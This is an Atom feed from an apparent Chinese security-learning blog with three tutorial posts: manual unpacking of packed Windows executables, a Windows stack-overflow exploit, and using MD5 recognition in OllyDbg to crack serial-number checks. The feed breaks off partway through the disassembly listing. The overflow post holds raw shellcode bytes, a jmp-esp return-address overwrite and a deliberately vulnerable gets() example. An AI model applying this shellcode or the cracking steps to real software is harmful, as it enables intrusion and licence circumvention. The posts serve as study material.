<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Enthusiasm And Focus</title>
  
  <subtitle>Always Maintain a Santa Claus</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-08-10T10:19:50.145Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>tfire</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>逆向之脱壳浅谈</title>
    <link href="http://yoursite.com/2019/08/09/%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3%E6%B5%85%E8%B0%88/"/>
    <id>http://yoursite.com/2019/08/09/逆向之脱壳浅谈/</id>
    <published>2019-08-09T09:53:59.000Z</published>
    <updated>2019-08-10T10:19:50.145Z</updated>
    
    <content type="html"><![CDATA[<h3 id="关于脱壳技术"><a href="#关于脱壳技术" class="headerlink" title="关于脱壳技术"></a><center>关于脱壳技术</center></h3><p><em>有加壳就一定有脱壳</em></p><hr><h4 id="1-壳的基础知识"><a href="#1-壳的基础知识" class="headerlink" title="1. 壳的基础知识"></a>1. 壳的基础知识</h4><ol><li><p>壳的加载过程：与病毒类似，比源程序更早的获得控制权。</p><ol><li><p>在初始化时保存个寄存器的值，等到外壳执行完成再恢复各寄存器的内容，最后跳转到源程序运行。</p></li><li><p>获取壳本身需要用到的API地址，一般只使用GetProcAddress，GetModuleHandle和LoadLibrary三个API函数，如果需要其他的用LoadLibrary加载。</p></li><li><p>按区块解密，把解密的区块数据按照区块的定义放在内存中合适的位置。</p></li><li><p>IAT的初始化</p></li><li><p>重定位项的处理，文件执行时将被映射到指定内存地址中，这个初始内存地址称为基址。对EXE的程序文件来说，Windows操作系统会尽量满足其要求。例如，某EXE文件的基地址为400000h, 而运行时 Windows操作系统提供给程序的基地址也是400000h, 在这种情况下就不需要进行地址 ”重定位” 了。由于不需要对EXE文件进行 ”重定位”，加壳软件干脆删除了原程序文件中用千保存重定位信息的区块（这样做可以使加壳后的文件更加小巧，有些工具提供的 “Wipe Reloc”功能其实就起到了这个作用）。</p></li><li><p>Hook API。在程序文件中，输入表的作用是让Windows操作系统在程序运行时将API的实际地址提供给程序使用。在程序的第1行代码被执行之前，Windows操作系统就完成了这项工作。<br>壳大都在修改原程序文件的输入表后自己模仿Windows操作系统的工作流程，向输入表中填充相关的数据。在填充过程中，外壳可以填充 HookAPI 代码的地址，从而间接获得程序的控制权。</p></li><li><p>跳转到程序原入口点(OEP)，从这个时候起，壳就把控制权还给原程序了。越来越多的加密壳先将 OEP 代码段搬到外壳的地址空间里，再将这段代码清除（这种技术称为 “Stolen Bytes”)。这样，OEP与外壳之间那条明显的 “分界线” 就消失了，脱壳的难度也就增加了。</p></li></ol></li><li><p>脱壳(主要是手动脱壳)</p><ol><li><em>查找真正的程序入口点</em></li><li><em>抓取内存映像文件</em></li><li><em>重建PE文件</em><br>程序 执行时，外壳代码首先获得控制权，模拟windows加载器，将原来的程序回复到内存中，此时内存中的数据就是加壳前的映像文件。适时将其抓取并修改，即可还原到加壳前的状态。</li></ol></li></ol><hr><h4 id="2-脱壳"><a href="#2-脱壳" class="headerlink" title="2. 脱壳"></a>2. 脱壳</h4><ol><li><h6 id="寻找OEP"><a href="#寻找OEP" class="headerlink" title="寻找OEP"></a>寻找OEP</h6><p><em>当外壳所保护的程序运行时，会先执行外壳程序，外壳程序负责将在内存中把源程序解压还原，并将控制权还给解压后的真正程序，再跳转到原来的程序入口点。这个入口点称为“OEP”</em></p><ol><li><p>根据跨段指令寻找OEP：<br>当外壳代码处理完毕会跳转带程序本身的代码处；所以根据跨段的转移指令就能找到真正的程序入口点。</p></li><li><p>根据内存访问断点寻找OEP：待代码段解压完毕对代码段设置内存访问断点。如果之前设置了断点，程序会不停的对代码进行写入的指令处中断。解决方法：即设置两次内存断点。因为一般的壳会依次对.text、 .rdata 、 .data 、 .rsrc区块进行解压处理，所以，可以先在.rdata 、 .data 等 区块处设置内存访问断点，待程序中断， 代码段已解压，再对代码段(.text块）设置内存访问断点，到达OEP。</p></li><li><p>根据栈平衡原理寻找OEP：在编写加壳软件时，必须保证外壳初始化的现场环境（各寄存器值）与原程序的现场环境是相同的（主要是esp、 ebp等重要的寄存器值）。加壳程序在初始化时保存各寄存器的值，待外壳执行完毕恢复 各寄存器的内容， 最后跳转到原程序执行。通常用pushad/popad、pushfd/popfd指令对来保存与恢复现场环境 。其中，eflags (标志寄存器 ）不是太重要， 一般不 处理它。也就是说，在编写加 壳软件时，必须遵守栈平衡原理。</p><table><thead><tr><th align="center">PUSHAD</th><th>相当于push eax/ecx/edx等</th></tr></thead><tbody><tr><td align="center">…</td><td>外壳代码</td></tr><tr><td align="center">POPAD</td><td>相当于pop eax/ecx/edx等</td></tr><tr><td align="center">JMP OEP</td><td>准备跳到入口点</td></tr><tr><td align="center">OEP:   …</td><td>解压后程序的源代码</td></tr></tbody></table></li></ol></li></ol><ol start="2"><li><h6 id="抓取内存映像"><a href="#抓取内存映像" class="headerlink" title="抓取内存映像"></a>抓取内存映像</h6><p>抓取内存映像， 也称 “转存” (Dump), 是指把内存指定地址的映像文件 读出，用文件等形式将其保存下来的过程。<br>脱壳时，在何时Dump 文件是有一定技巧的。在一般情况下，当外壳来到 OEP 处时进行Dump 是正确的。如果等到程序运行起来， 由于一些变量已经初始化了， 不适合进行 Dump。在外壳处理过程中， 外壳要把压缩后的全部代码数据释放到内存中， 并初始化一些项目。</p><p><strong>Dump原理：</strong><br>常用的Dump软件 有LordPE、PETools等。这类工具一般利用 Module32Next来获取欲Dump 进 程的 基本信息。Module32Next 函数的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Module32Next</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE hSnapshot ,</span></span></span><br><span class="line"><span class="function"><span class="params">LPMODULEENTRY32 lpme</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br></pre></td></tr></table></figure><p>•    hSnapshot : 由先前的CreateToolhelp32Snapshot 函数返回的快照。<br>•    lpme: 指向MODULEENTRY32结构的指针。</p><p><em>每次执行函数后，都会把一个进程的信息填入MODULEENTRY32结构。</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMODULEENTRY32</span> &#123;</span></span><br><span class="line">DWORD dwSize;</span><br><span class="line">DWORD th32ModuleID;</span><br><span class="line">DWORD th32ProcessID;</span><br><span class="line">DWORD GlblcntUsage;</span><br><span class="line">DWORD ProccntUsage;</span><br><span class="line">BYTE *modBaseAddr;</span><br><span class="line">DWORD modBaseSize;</span><br><span class="line">HMODULE hModule;</span><br><span class="line">TCHAR szModule[MAX_PATH];</span><br><span class="line">TCHAR szExePath[MAX_PATH];</span><br><span class="line">&#125; MODULEENTRY32, *PMODULEENTRY32, *LPMODULEENTRY32;</span><br></pre></td></tr></table></figure><p>LordPE和ProcDump都是先根据此结构中的 modBaseSize和modBaseAddr 字段得到进程的映像 大小和基址，再调用 ReadProcessMemory来读取进程内的数据的。如果读取成功，ProcDump会检测 IMAGE_DOS_SIGN ATURE和IMAGE_NT_SIGNATURE 是否完整。如果完整，就基本上不会对剩余的大多数字段进行检验了；如果不 完整， 会根据 szExePath字段打开进程的原始文件 ，读取其文件头以取代进程的文件头。LordPE则更简单，根本不使用进程的文件头，而直接读取原始文件 的文件头， 在读取内存数据后，再把进程中的数据保存到磁盘文件 中。</p></li></ol><ol start="3"><li><h6 id="重建PE文件"><a href="#重建PE文件" class="headerlink" title="重建PE文件"></a>重建PE文件</h6><p>破坏原程序的输入表是加密外壳必须具备的功能。在脱壳中，输入表处理是此要求脱壳者对PE格式中的输入表概念非常清楚。</p><ol><li>输入表重建的原理：在输入表结构中，与实际运行相关的主要是IAT结构，这个结构用于保存 API的实际地址。PE文件运行时将初始化输入表的这一部分，Wind ows加载器首先搜索 OriginalFirstThunk, 如果存在，加载程序将迭代搜索数组中的每个指针，找到每个IMAGE_IMPORT_BY_NA ME 结构所指向的输入函数的地址，然后，加载器用函数真正的入口地址代替由FirstThunk指向的IMAGE_THUNK_DATA 数组里元素的值。 此时，输入表中的其他部分就不重要了，程序依靠IAT提供的函数地址就可以正常运行。外壳程序一般都会修改原程序文件的输入，然后自己模仿PE装载器来填充IAT的相关数据，也就是说，内存中只有一个IAT, 原程序的输入表不在内存中。输入表重建就是根据这个IAT还原整个输入表的结构（即如图16.17所示的这个结构），包括IID结构及其各成员指向的数据等。一些加密软件为 了防止输入表被还原， 就在IAT加密上大作文章。此时， 由外壳填充到IAT里 的不是实际的 API 地址，而是用于Hook API的外壳 代码的地址 。这样， 外壳中的代码一旦完成了加 载工作，在进入原程序的代码之后，仍然能够间接 获得程序的控制权。因为程序总要与系统打交道，与系统打交道的途径是 API, 而API的地址已经被替换成了外壳的Hook API的地址，所以， 每次程序与系统打交道，都会让外壳的代码获得一次 控制权。这样， 外壳 就可以 进行反跟踪， 从而继续保护软件， 同时完成某些特殊的任务了 。综上所述， <strong>重建输入表的关键是获取未加密的IAT。 一般的 做法是跟踪加壳程序对IAT的处理过程， 修改相关指令， 不让外壳加密 IAT。</strong></li><li>确定IAT的地址与大小：一般程序的IAT是连续排列的， 以一个DWORD字的O作为结束， 因此， 只要确定IAT的一个点， 就能获得整个IAT的地址和大小。</li><li>根据IAT重建输入表：数据处理完成后，UPX外壳使用了一次跨段的转移指令勺mp)跳转到OEP,发现OEP的地址为401000h,因此只需要在4052BFh处设置断点。程序中断后，运行LordPE,将内存数据Dump出来并保存为dumped.exe。用十六进制工具在dumped.exe文件中找一块空间，在这里选择2100h,将表16.1中的DLL名和<br>函数名写进去，如图16.27所示。DLL名与函数名的位置可以任意指定。在每个函数名前面要留2 字节来存放函数的序号，序号可以为O;每个函数名后的1字节为O;每个函数名或DLL名的起始地址必须按偶数对齐， 空隙用0填充。由千是内存映像文件，文件 偏移地址与相对虚拟地址(RVA)的值是相等的，IAT 的位置很重要，不能改变，否则相关指令就找不到函数调用地址了（除非再修正这些函数调用的地址）。IAT 中的内容可以不重新构造，当加载PE文件时，Windows操作系统会对其进行填充。</li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;关于脱壳技术&quot;&gt;&lt;a href=&quot;#关于脱壳技术&quot; class=&quot;headerlink&quot; title=&quot;关于脱壳技术&quot;&gt;&lt;/a&gt;&lt;center&gt;关于脱壳技术&lt;/center&gt;&lt;/h3&gt;&lt;p&gt;&lt;em&gt;有加壳就一定有脱壳&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;1
      
    
    </summary>
    
    
      <category term="逆向工程" scheme="http://yoursite.com/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>再谈栈溢出</title>
    <link href="http://yoursite.com/2019/08/05/%E5%86%8D%E8%B0%88%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://yoursite.com/2019/08/05/再谈栈溢出/</id>
    <published>2019-08-05T01:29:18.000Z</published>
    <updated>2019-08-05T09:46:30.544Z</updated>
    
    <content type="html"><![CDATA[<h3 id="再谈栈溢出"><a href="#再谈栈溢出" class="headerlink" title="再谈栈溢出"></a><center>再谈栈溢出</center></h3><hr><p>​    上回书说到，向缓冲区内填充数据，如果数据很长，超过缓冲区本身容量，数据会溢出空间，覆盖合法数据。但是，可以精心设计溢出数据，造成攻击。</p><hr><h4 id="1-本地缓冲区溢出简单利用"><a href="#1-本地缓冲区溢出简单利用" class="headerlink" title="1. 本地缓冲区溢出简单利用"></a>1. 本地缓冲区溢出简单利用</h4><p>已有条件：</p><pre><code>1. 知道有问题程序返回点的精准地址，即可以把他覆盖成任意地址。2. 有了shellcode。3. 把有问题程序返回点地址覆盖成shellcode地址，即可成功利用缓冲区溢出。</code></pre><p>现在的目的：shellcode的地址是什么？即把返回点地址覆盖成什么？</p><p>​    在windows下利用系统核心dll里的指令完成跳转。</p><p>​    <strong>用系统核心dll中的jmp esp 地址来覆盖返回地址，然后把shellcode紧跟其后。</strong></p><p>​    利用格式：NNNNNNNNRSSSSSSSS，N=Nop，R=jmp esp，S=shellcode。</p><p>覆盖之后堆栈图示：</p><table><thead><tr><th align="center">…</th></tr></thead><tbody><tr><td align="center">Nop</td></tr><tr><td align="center">Nop</td></tr><tr><td align="center">Nop</td></tr><tr><td align="center">Jmp esp（原eip）</td></tr><tr><td align="center">S0</td></tr><tr><td align="center">S1</td></tr><tr><td align="center">S2</td></tr><tr><td align="center">s3</td></tr><tr><td align="center">…</td></tr></tbody></table><p>函数执行完成之后，esp指向原eip地址，而eip指向Ret指令</p><p>（eip指向下一条指令地址，Ret指令相当于pop eip）。</p><p>当eip被覆盖为 jmp esp之后，ret 相当于指向 jmp esp的地址。然后esp下移，指向S0，然后开始执行Shellcode。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. EIP 指令指针指向下一条要执行的命令，一般会自动加 2. ESP 堆栈顶指针指向堆栈的顶部。在PUSH 时，ESP 往上走，减 1；在 POP 时，ESP 往下走，加 1。</span><br></pre></td></tr></table></figure><hr><h4 id="2-栈溢出的简单构筑"><a href="#2-栈溢出的简单构筑" class="headerlink" title="2. 栈溢出的简单构筑"></a>2. 栈溢出的简单构筑</h4><p>以一简单c为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">"tfire"</span>;</span><br><span class="line"><span class="keyword">char</span> output[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(output, name);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\\0x%x"</span>, output[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\0x74\0x66\0x69\0x72\0x65\0x0\0xfffffffe\0xfffffffe</span><br></pre></td></tr></table></figure><p>给出转换表：</p><p><img src="/2019/08/05/再谈栈溢出/8.6.png" alt></p><p>给出shellcode机器码（功能为打开dos窗口）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char shellcode[]=</span><br><span class="line">&#123;</span><br><span class="line">0x8B,0xE5, 0x55,0x8B,0xEC,0x83,0xEC,0x0C,0xB8, 0x63,0x6F,0x6D,0x6D,0x6D,0x6D,0x6F,0x63,0x89, 0x45,0xF4,0xB8,0x61,0x6E,0x64,0x2E,0x89,0x45, 0xF8,0xB8,0x63,0x6F,0x6D,0x22,0x89,0x45,0xFC, 0x33,0xD2, 0x88,0x55,0xFF, 0x8D,0x45,0xF4,  0x50, 0xB8,0x24,0x98,0x01,0x78, 0xFF,0xD0</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将name[]进行构造：</p><table><thead><tr><th align="center">name[8]</th><th align="center">ebp</th><th align="center">RET</th><th align="center">ShellCode</th></tr></thead><tbody><tr><td align="center">AAAAAAAA</td><td align="center">AAAA</td><td align="center">0x76388b13</td><td align="center">SSSSSSSS</td></tr></tbody></table><p><em>关于这个jmp esp的地址，会因为windows版本不同而不同。</em></p><p>在网上找了一个加载动态库esp地址的代码（这个还没看到…）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">char</span>**, <span class="keyword">char</span>**)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE* pbyte;</span><br><span class="line"><span class="keyword">int</span> nPos = <span class="number">0</span>, nAddr = <span class="number">0</span>;</span><br><span class="line">HINSTANCE hHinst = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> bTips = <span class="literal">true</span>;</span><br><span class="line">hHinst = LoadLibrary(<span class="string">"user32.dll"</span>);</span><br><span class="line"><span class="keyword">if</span> (!hHinst) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">pbyte = (BYTE*)hHinst;</span><br><span class="line"><span class="keyword">while</span> (bTips)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pbyte[nPos] == <span class="number">0xff</span> &amp;&amp; pbyte[nPos + <span class="number">1</span>] == <span class="number">0xe4</span>)</span><br><span class="line">&#123;</span><br><span class="line">nAddr = (<span class="keyword">int</span>)pbyte + nPos;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"address is 0x%x\n"</span>, nAddr);</span><br><span class="line">bTips = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">nPos++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hHinst != <span class="literal">NULL</span>) FreeLibrary(hHinst);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x76388b13</span><br></pre></td></tr></table></figure><p>将代码合并整理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[]=</span><br><span class="line">&#123;</span><br><span class="line"> <span class="string">"\x41\x41\x41\x41\x41\x41\x41\x41"</span><span class="comment">//name=AAAA</span></span><br><span class="line"> <span class="string">"\x41\x41\x41\x41"</span>   <span class="comment">//ebp=AAAA   </span></span><br><span class="line"> <span class="string">"\x13\x8b\x38\x76"</span>   <span class="comment">//覆盖成jmp esp地址</span></span><br><span class="line"> <span class="string">"0x8B,0xE5,    0x55,0x8B,0xEC,0x83,0xEC,0x0C,0xB8, 0x63,0x6F,0x6D,0x6D,0x6D,0x6D,0x6F,0x63,0x89, 0x45,0xF4,0xB8,0x61,0x6E,0x64,0x2E,0x89,0x45, 0xF8,0xB8,0x63,0x6F,0x6D,0x22,0x89,0x45,0xFC, 0x33,0xD2, 0x88,0x55,0xFF, 0x8D,0x45,0xF4,  0x50, 0xB8,0x24,0x98,0x01,0x78, 0xFF,0xD0"</span></span><br><span class="line">     <span class="comment">//此处为shellcode地址，功能为打开dos窗口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来执行程序，明明是字符串的复制，却会打开dos窗口，至此，缓冲区溢出构建完成。</p><hr><h4 id="3-溢出实例"><a href="#3-溢出实例" class="headerlink" title="3. 溢出实例"></a>3. 溢出实例</h4><p>看一个简单代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> passsword[<span class="number">8</span>] = <span class="string">"secret"</span>, input[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Enter your password:"</span>);</span><br><span class="line">        gets(input);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, passsword) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Welcome!\n"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Sorry,your password is wrong.\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看看结果吧</p><p><img src="/2019/08/05/再谈栈溢出/8.5.png" alt></p><p>What？？</p><p>输入ok居然对了？？</p><p>这就是缓冲区溢出造成的，具体已经解释过了，着迷人的魅力啊~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;再谈栈溢出&quot;&gt;&lt;a href=&quot;#再谈栈溢出&quot; class=&quot;headerlink&quot; title=&quot;再谈栈溢出&quot;&gt;&lt;/a&gt;&lt;center&gt;再谈栈溢出&lt;/center&gt;&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;​    上回书说到，向缓冲区内填充数据，如果数据很长，超过缓冲区本身容
      
    
    </summary>
    
    
      <category term="二进制" scheme="http://yoursite.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>几种加密算法</title>
    <link href="http://yoursite.com/2019/08/02/%E5%87%A0%E7%A7%8D%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>http://yoursite.com/2019/08/02/几种加密算法/</id>
    <published>2019-08-02T07:42:20.000Z</published>
    <updated>2019-08-02T10:43:25.658Z</updated>
    
    <content type="html"><![CDATA[<h3 id="浅谈几种加密算法之Hash算法"><a href="#浅谈几种加密算法之Hash算法" class="headerlink" title="浅谈几种加密算法之Hash算法"></a><center>浅谈几种加密算法之Hash算法</center></h3><hr><h4 id="单向散列算法（Hash算法）"><a href="#单向散列算法（Hash算法）" class="headerlink" title="单向散列算法（Hash算法）"></a>单向散列算法（Hash算法）</h4><p>   简介：常见的Hash算法包括<em>MD5，SHA， RIPE-MD ，HAVAL</em>等</p><p>对于解密而言，只要能识别出是何种算法，就可以直接套用相关算法的源码解决。</p><h5 id="1-MD5算法："><a href="#1-MD5算法：" class="headerlink" title="1.MD5算法："></a>1.MD5算法：</h5><h6 id="算法原理："><a href="#算法原理：" class="headerlink" title="算法原理："></a>算法原理：</h6><ol><li><p>数据填充：附加一个1在消息后面，然后用0来填充，直到消息长度与448模512同余（长度=448模512），即<strong>填充后的消息长度比512的倍数小64位</strong></p></li><li><p>添加长度：如果填充前消息的长度大于2的64次方 , 则只使用其低 64位。添加填充位和消息长度之后，最终消息的长度正好是 512 的整数倍。令 M[O···N-I] 表示最终的消息，其中 N是 16 的倍数。</p></li><li><p>初始化变量：用4个变量(A、B、C、D)来计算消息摘要。这里的A、B、 C、D都是32位的寄存器。这些寄存器以下面的十六进制数来初始化：<br>A = 01234567h, B = 89abcdefh, C = fedcba98h, D = 7654321 Oh 而且，在内存中是以低字节在前的形式存储的， 即如下格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01 23 45 67 89 AB CD EF FE DC BA 98 76 54 32 10</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>数据处理：所用的加法常数由表T[i]来定义， 其中 l为1至64之中的值。T[i]等于4294967296乘以abs(sin(i))所得结果的整数部分， 其中l用弧度来表示。这样做是为了通过正弦函数和幕函数来进一 步消除变换中的线性。</p><p>算法具体实现较为复杂。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=A+AA</span><br><span class="line">B=B+BB </span><br><span class="line">C=C+CC </span><br><span class="line">D=D+CC</span><br></pre></td></tr></table></figure></li><li><p>输出：当512位分组都运算完毕， A、 B、 C、 D的级联将被输出为MD5散列的结果。</p></li></ol><h6 id="算法应用："><a href="#算法应用：" class="headerlink" title="算法应用："></a>算法应用：</h6><p>​    看一看如下使用MD5判断注册码的伪码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( MD5(用户名) ＝＝ 序列号 )</span><br><span class="line"></span><br><span class="line">​正确的注册码；</span><br><span class="line"></span><br><span class="line">​else</span><br><span class="line"></span><br><span class="line">​错误的注册码</span><br></pre></td></tr></table></figure><p>从上面看出了什么？</p><p><strong>序列号就以明文的形式存在内存中！！！</strong></p><p>MD5代码的特点非常明显， 跟踪时很容易发现。 如果软件采用MD5算法， 在初始化数据时必然会用到上面提到的4个常数(A、 B 、 C、 D)。 实际上， 像KANAL这样的算法分析工具不是通过这4个常数来鉴别MD5的，而是通过识别具有64个常骰元素的表T来判断是不是MD5算法的。对于变形的MD5算法，常见的情况有3种： <strong>一是改变初始化时用到的4个常数；二是改变填充的方法； 三是改变Hash变换的处理过程</strong>。 在解密时， 只要跟踪以上这些点， 对MD5的源代码进行修改， 就可以实现相应的注册机制了</p><h5 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h5><p>用OD打开一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0040118B  |.  FFD5          call    ebp                              ; \GetDlgItemTextA</span><br><span class="line">0040118D  |.  83F8 13       cmp     eax, 13                          ;  密码长度0x13位</span><br><span class="line">00401190  |.  0F85 F3000000 jnz     00401289</span><br><span class="line">00401196  |.  8A4C24 64     mov     cl, byte ptr [esp+64]            ;  注册码第五位是-吗</span><br><span class="line">0040119A  |.  B0 2D         mov     al, 2D</span><br><span class="line">0040119C  |.  3AC8          cmp     cl, al</span><br><span class="line">0040119E  |.  0F85 E5000000 jnz     00401289</span><br><span class="line">004011A4  |.  384424 69     cmp     byte ptr [esp+69], al            ;  注册码第十位是-吗</span><br><span class="line">004011A8  |.  0F85 DB000000 jnz     00401289</span><br><span class="line">004011AE  |.  384424 6E     cmp     byte ptr [esp+6E], al            ;  注册码第十五位是-吗</span><br><span class="line">004011B2  |.  0F85 D1000000 jnz     00401289</span><br><span class="line">004011B8  |.  8B4C24 65     mov     ecx, dword ptr [esp+65]</span><br><span class="line">004011BC  |.  8B4424 60     mov     eax, dword ptr [esp+60]</span><br><span class="line">004011C0  |.  8B5424 6A     mov     edx, dword ptr [esp+6A]</span><br><span class="line">004011C4  |.  894C24 14     mov     dword ptr [esp+14], ecx</span><br><span class="line">004011C8  |.  894424 10     mov     dword ptr [esp+10], eax</span><br><span class="line">004011CC  |.  8B4424 